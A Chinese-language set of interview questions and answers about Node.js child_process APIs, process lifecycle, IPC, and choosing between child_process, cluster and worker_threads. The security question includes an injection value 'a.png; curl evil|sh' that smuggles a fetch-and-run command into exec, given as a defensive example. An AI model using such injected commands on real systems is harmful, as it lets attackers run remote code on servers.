# node-child-process 面试题精选

> 共 15 题，覆盖 API 取舍 / 安全 / 生命周期 / IPC / 多进程选型 五类。

---

## 一、四个 API 的取舍

### 1. `spawn`、`exec`、`execFile`、`fork` 有什么区别？分别什么时候用？

- **`spawn(cmd, args[])`**：启动子进程，`stdout`/`stderr` 是**流**，边出边读，不缓冲全量输出。适合**长时间运行、输出很大、交互式**的命令（`tail -f`、`ffmpeg`、`git`）。
- **`execFile(cmd, args[])`**：执行**单个可执行程序**，把输出**缓冲**成字符串再交给回调，**默认不经 shell**。适合"跑一个命令拿结果、输出不大"。
- **`exec(cmdString)`**：执行一整条**命令串**，**经 shell 解析**（支持管道 `|`、重定向 `>`、`$VAR`、通配符）。也缓冲输出。
- **`fork(modulePath)`**：`spawn` 的特化，专门启动**另一个 Node 脚本**，并自动建立 **IPC 通道**（`send`/`message`）。

口诀：**流式大输出→spawn；跑单程序拿结果→execFile；要 shell 特性→exec；启动 Node 子进程并通信→fork。**

**来源**：Node.js — "Child Process"（官方文档 API 概览）

### 2. `exec` 和 `execFile` 都返回缓冲输出，为什么很多场景更推荐 `execFile`？

`execFile` **不经过 shell**，参数以数组直接传给目标程序，因此：

1. 没有 shell 语法解析，天然规避**命令注入**；
2. 少一个 shell 进程、开销略小、行为更跨平台一致；
3. 只有当你**确实需要**管道/重定向等 shell 特性时才退回 `exec`（或 `spawn` + `shell:true`）。

**来源**：Node.js — "Child Process: exec vs execFile"、OWASP — "Command Injection"

### 3. 输出可能非常大（比如一个命令打印几百 MB），该用哪个 API？为什么？

用 **`spawn`**。`exec`/`execFile` 会把输出全部**缓冲到内存**，超过 `maxBuffer`（默认约 1MB）会**杀死子进程**并报错 `ERR_CHILD_PROCESS_STDOUT_MAXBUFFER`。`spawn` 的 `stdout` 是可读流，可用 `for await`/`pipeline` 边读边处理，内存恒定（呼应 node-streams、node-stream-pipeline）。

**来源**：Node.js — "maxBuffer and large outputs"

---

## 二、安全

### 4. 把用户输入拼进 `exec` 的命令串，会造成什么漏洞？怎么防？

**命令注入（OS Command Injection）**。因为 `exec` 经 shell 解析，输入里的 `;`、`&&`、`|`、反引号、`$(...)` 会被当作 shell 语法执行：

```js
// ❌ 用户输入 "a.png; curl evil|sh"
exec(`convert ${userInput} out.png`);
```

防御：

1. **优先 `execFile`/`spawn` + 参数数组**，不经 shell，输入只当普通参数；
2. 必须用 shell 时，对参数做**严格白名单校验**（如只允许 `[a-zA-Z0-9._-]`），而非靠"加引号"（引号也能被闭合绕过）；
3. 最小权限运行、避免用 root 跑子进程。

**来源**：OWASP — "Command Injection"、Node.js Security — "Avoid exec with user input"

---

## 三、生命周期与退出

### 5. `'exit'` 和 `'close'` 事件有何区别？想确保输出全读完再收尾，等哪个？

- **`'exit'(code, signal)`**：子进程**终止**时触发，但 stdio 管道的缓冲**可能还没 flush 完**、数据未必都读到了。
- **`'close'(code, signal)`**：在子进程终止 **且 stdio 流也都关闭**后触发。

要"确保输出都读完了再收尾"用 **`'close'`**。多数情况下你还会两个都监听，或以 `close` 为准。

**来源**：Node.js — "'exit' vs 'close' event"

### 6. 回调里的 `code` 和 `signal` 分别代表什么？被 `SIGKILL` 杀死时它们是？

- `code`（退出码）：进程**正常退出**（自己 `exit(n)`）时非 0/正整数；Unix 惯例 `0` 成功、非 0 失败。
- `signal`：进程**被信号终止**时给出信号名（如 `'SIGTERM'`/`'SIGKILL'`），此时 `code` 通常为 `null`。
- 被 `SIGKILL` 杀死：`code === null`、`signal === 'SIGKILL'`；若是因超时/主动 `kill` 触发，`err.killed === true`。

**来源**：Node.js — "Exit events and codes"、Wikipedia — "Exit status"

### 7. `child.kill()` 之后，为什么命令的孙进程可能还活着？如何彻底清理？

`kill` 只向**直接子进程**发信号。若开了 `shell:true`，shell 是子、真正的命令是 shell 派生的**孙进程**；或子进程自己又 `spawn` 了下级——它们不在同一动作范围内，会成为**孤儿进程**继续跑。

彻底清理：用 `detached: true` 让子进程成为**新进程组组长**，再对整个进程组发信号 `process.kill(-child.pid, 'SIGTERM')`（负号表示进程组）。容器里 PID 1 的信号/僵尸处理要额外注意。

**来源**：Node.js — "detached children and process groups"、Stack Overflow — "kill grandchild processes"

---

## 四、fork 与 IPC

### 8. `fork` 和 `spawn` 的关键差别是什么？

`fork` 是 `spawn` 的**特化**：

1. 专用于启动**另一个 Node 进程**（默认用当前 `node` 可执行文件跑给定脚本）；
2. 自动建立**IPC 通道**，父子可直接 `child.send(msg)` / `child.on('message', ...)`、子进程 `process.send` / `process.on('message')`。

`spawn` 跑任意程序、没有这条开箱即用的消息通道（要通信得自己走 stdio）。

**来源**：Node.js — "child_process.fork"

### 9. IPC 消息能传什么、不能传什么？`transfer` 是干什么的？

消息走**结构化克隆序列化**：普通对象、数组、字符串、数字、Buffer、Map/Set 等可传；**函数、Symbol、类实例的原型方法、循环里的不可序列化成员**传不过去。

`send(msg, { transfer: [handle] })` 可转移 **net/tcp/socket 句柄**或 **ArrayBuffer**（所有权转移、非拷贝）——这正是 **cluster 把监听 socket 分发给 worker** 的底层机制（呼应 node-cluster）。

**来源**：Node.js — "Interprocess communication / send handles"、MDN — "Structured clone algorithm"

### 10. 父进程 `fork` 了子进程后，父进程"关不掉/退出卡住"，常见原因？

子进程（或某个连接、定时器）持有**活跃句柄**，事件循环不能空退出（呼应 node-event-loop）。典型：`fork` 出的 worker 没被 `kill`/`disconnect`、或父进程没清理 IPC。排查：`process._getActiveHandles()`、检查是否遗忘了 `unref()`、确保退出前显式 `child.kill()` 或子进程 `process.disconnect()`。

**来源**：Node.js — "Why won't my process exit?"、node-event-loop 相关

---

## 五、多进程 / 多线程选型

### 11. 什么时候用 `child_process`、什么时候用 `cluster`、什么时候用 `worker_threads`？

- **child_process**：要跑**外部非 Node 程序**（git、ffmpeg、系统命令），或需要**完全独立、崩溃互不影响、无共享内存**的进程。
- **cluster**：**HTTP 服务多核扩展**——多个 worker **共享同一监听端口**分摊连接（I/O 密集、利用多核又各自独立堆）。
- **worker_threads**：**同进程内的线程**，需要**共享内存**（`ArrayBuffer`/`SharedArrayBuffer`）或把一段 **CPU 密集计算**挪出主线程、不阻塞事件循环。

**来源**：Node.js — "Worker Threads vs Child Process vs Cluster"、社区 — "When to use cluster vs worker_threads"

### 12. 用 `fork` 起多个 Node 进程来"利用多核"，和直接用 `cluster` 有什么本质不同？

`fork` 出的每个进程**独立监听会各自 bind 端口→端口冲突**，你要自己做连接分发、做重启守护、做端口复用。**`cluster` 就是把这些封装好了**：master 持有一个监听 socket，通过 IPC **句柄 transfer**（见第 9 题）把连接公平分给各 worker，并提供 worker 挂了自动重启等能力。所以"多核跑同一 HTTP 服务"应直接用 `cluster`（或 pm2 的 cluster 模式），而非手写 `fork` 循环。

**来源**：Node.js — "Cluster Module"、pm2 — "Cluster mode"

---

## 补充（新专题 13-15）

### 13. 给一张 spawn/exec/execFile/fork/execSync 的选型决策表，并说说各自主线程代价。

维度：shell（exec 有→注入面；execFile/spawn 无）、输出获取（spawn 流式 vs exec* 缓冲 maxBuffer 截断报 ENOBUFS）、IPC（fork/spawn stdio ipc 独有）、Windows 参数转义（spawn 数组自动引用，手拼字符串是事故源）。主线程代价：同步系（execSync 等）阻塞事件循环全程（服务里禁，脚本可用）；异步系只付「派生 + fd 管道」成本，回调在 loop 里跑。选型：跑外部命令默认 execFile（无 shell、缓冲）/spawn（大输出、流式、需精细 stdio）；Node 子进程要通信才 fork（本质 spawn+ipc channel，独立 V8 内存全隔离）；别拿 execSync 在服务里「图省事」。附加题：posix_spawn vs fork+exec（Node 用 uv_spawn，Windows 无 fork 语义——「fork 出非 Node 程序」在 Win 报错）。

**来源**：Node child_process 文档 API 对照表；libuv uv_spawn 平台实现说明（Windows CreateProcess）。

### 14. fork 的 IPC channel 底层是什么？为什么消息里不能直接传函数/class 实例？

底层：一对 socketpair（POSIX Unix socket / Win 命名 pipe）上的 JSON 序列化 + 特殊「句柄传递」协议——process.send 走 JSON（structuredClone 选项可开），所以函数/ Symbol/ 闭包/类实例（原型链丢失）全不可传。能传的：可序列化数据 + **net.Server/net.Socket 句柄**（send(msg, server) 把监听 fd 过继给子进程——cluster 端口共享正是靠这个，本关 cluster 题的底层答案）。想要共享内存不是塞消息：SharedArrayBuffer 可以 postMessage 语义传给 worker 而非 child（跨进程共享要 OS mmap/文件映射库）。设计口径：进程边界=序列化边界，API 按「消息合同」设计（type 字段判别联合），别指望引用穿透。

**来源**：Node process.send/channel 文档与 handle 传递协议；cluster 源码（共享 server 句柄实现）。

### 15. 父进程 fork 子进程后，父退出时「关不掉/退得慢/子变僵尸」三类问题各怎么治？

关不掉：父没等 IPC drain 就 exit——send 后立刻 exit 消息丢失，规范是 send 回调/once("exit") 再退；子忽略信号——SIGTERM 默认终止但进程可捕获不退，父兜底 kill(SIGKILL) + 超时升级（先 TERM 后 KILL 的优雅阶梯，本关 deploy 关呼应）。退得慢：父事件循环被子的 stdio/socket 句柄 ref 住——不想要就 unref 或显式 kill。僵尸：子退出但父不 wait——Node spawn 内部会 reap，但 detached 子（脱离父进程组）变孤儿挂 init 不是僵尸；容器里 init=node 且 PID 1 才需自己 reap（本关 PID 1 题的 zombie 面：init 缺失僵尸堆积）。制度：启动即登记 children 数组，SIGTERM 时统一 TERM→限时→KILL→await exit 收尸，测试注入「子卡死」验证 30s 内全绿。

**来源**：Node child 进程 exit/close 事件与 kill 语义文档；Linux 僵尸进程与 PID 1 reaping（npm/Docker base image 讨论）。
